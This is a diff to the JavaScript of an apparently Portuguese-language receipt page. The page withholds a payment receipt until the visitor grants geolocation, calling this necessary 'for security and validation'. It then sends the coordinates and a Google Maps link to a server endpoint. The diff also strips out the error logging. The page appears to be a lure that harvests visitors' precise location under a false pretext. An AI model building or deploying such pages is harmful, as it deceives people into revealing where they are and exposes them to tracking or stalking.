@@ -20,7 +20,6 @@ const botaoEmitirNovamente = document.getElementById("botao-emitir-novamente");
 const botaoTentarGenerico = document.getElementById("botao-tentar-generico");
 
 let isProcessing = false;
-let permissionRequested = false;
 
 if (!receiptData) {
     window.location.replace("/");
@@ -40,7 +39,6 @@ if (!receiptData) {
 function iniciarFluxoValidacao() {
     mostrarEstado("carregamento");
     isProcessing = false;
-    permissionRequested = false;
 
     if (navigator.permissions && navigator.permissions.query) {
         navigator.permissions.query({ name: 'geolocation' })
@@ -50,7 +48,10 @@ function iniciarFluxoValidacao() {
                 } else if (permissionStatus.state === 'denied') {
                     mostrarEstado("erro-permissao");
                 } else {
-                    mostrarMensagemSeguranca();
+                    const msgCarregamento = document.querySelector("#estado-carregamento p");
+                    if (msgCarregamento) {
+                        msgCarregamento.textContent = "A localização é necessária por motivos de segurança e validação para acessar o comprovante.";
+                    }
                     obterLocalizacao();
                 }
             })
@@ -59,13 +60,6 @@ function iniciarFluxoValidacao() {
             });
     } else {
         obterLocalizacao();
-    }
-}
-
-function mostrarMensagemSeguranca() {
-    const mensagemCarregamento = document.querySelector("#estado-carregamento p");
-    if (mensagemCarregamento) {
-        mensagemCarregamento.textContent = "A localização é necessária por motivos de segurança e validação para acessar o comprovante.";
     }
 }
 
@@ -91,17 +85,13 @@ function obterLocalizacao() {
 function handleGeoError(error) {
     isProcessing = false;
 
-    console.error("Erro de geolocalização:", error);
-
     switch (error.code) {
         case error.PERMISSION_DENIED:
             mostrarEstado("erro-permissao");
             break;
-
         case error.TIMEOUT:
             mostrarEstado("erro-timeout");
             break;
-
         case error.POSITION_UNAVAILABLE:
         default:
             mostrarEstado("erro-generico");
@@ -116,9 +106,7 @@ function sendLocation(position) {
     const longitude = position.coords.longitude;
     const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-    const API_URL = "/api/send-location";
-
-    fetch(API_URL, {
+    fetch("/api/send-location", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
@@ -138,42 +126,33 @@ function sendLocation(position) {
                 mostrarEstado("erro-generico");
             }
         })
-        .catch(error => {
-            console.error("Erro ao enviar:", error);
+        .catch(() => {
             mostrarEstado("erro-generico");
         });
 }
 
 function mostrarEstado(estado) {
-    estadoCarregamento.hidden = true;
-    estadoErroPermissao.hidden = true;
-    estadoErroTimeout.hidden = true;
-    estadoErroGenerico.hidden = true;
-    conteudoComprovante.hidden = true;
+    estadoCarregamento.style.display = "none";
+    estadoErroPermissao.style.display = "none";
+    estadoErroTimeout.style.display = "none";
+    estadoErroGenerico.style.display = "none";
+    conteudoComprovante.style.display = "none";
 
     switch (estado) {
         case "carregamento":
-            estadoCarregamento.hidden = false;
-            const msgCarregamento = document.querySelector("#estado-carregamento p");
-            if (msgCarregamento && !permissionRequested) {
-                msgCarregamento.textContent = "A localização é necessária por motivos de segurança e validação para acessar o comprovante.";
-            }
+            estadoCarregamento.style.display = "flex";
             break;
-
         case "erro-permissao":
-            estadoErroPermissao.hidden = false;
+            estadoErroPermissao.style.display = "flex";
             break;
-
         case "erro-timeout":
-            estadoErroTimeout.hidden = false;
+            estadoErroTimeout.style.display = "flex";
             break;
-
         case "erro-generico":
-            estadoErroGenerico.hidden = false;
+            estadoErroGenerico.style.display = "flex";
             break;
-
         case "comprovante":
-            conteudoComprovante.hidden = false;
+            conteudoComprovante.style.display = "block";
             break;
     }
 }
